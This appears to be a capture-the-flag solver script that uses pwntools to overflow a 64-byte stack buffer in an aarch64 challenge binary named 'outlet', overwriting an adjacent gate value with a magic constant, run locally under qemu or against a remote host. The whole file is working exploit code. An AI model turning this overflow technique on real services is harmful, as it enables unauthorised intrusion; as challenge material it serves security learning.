#!/usr/bin/env python3
"""
Overflow Outlet solver.
Local:  python3 solve.py
Remote: python3 solve.py HOST 9001
"""
import sys
from pwn import *

context.log_level = "info"

MAGIC = 0xCAFEBABEDEADBEEF
OFFSET = 64  # aarch64: buf at sp+0x18, gate at sp+88 -> 64 bytes, no padding

if len(sys.argv) >= 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    # the binary is aarch64; run it locally under qemu-user
    io = process(["qemu-aarch64-static", "./outlet"])

io.recvuntil(b"sequence:")
io.send(b"A" * OFFSET + p64(MAGIC))
print(io.recvall(timeout=3).decode(errors="replace").strip())
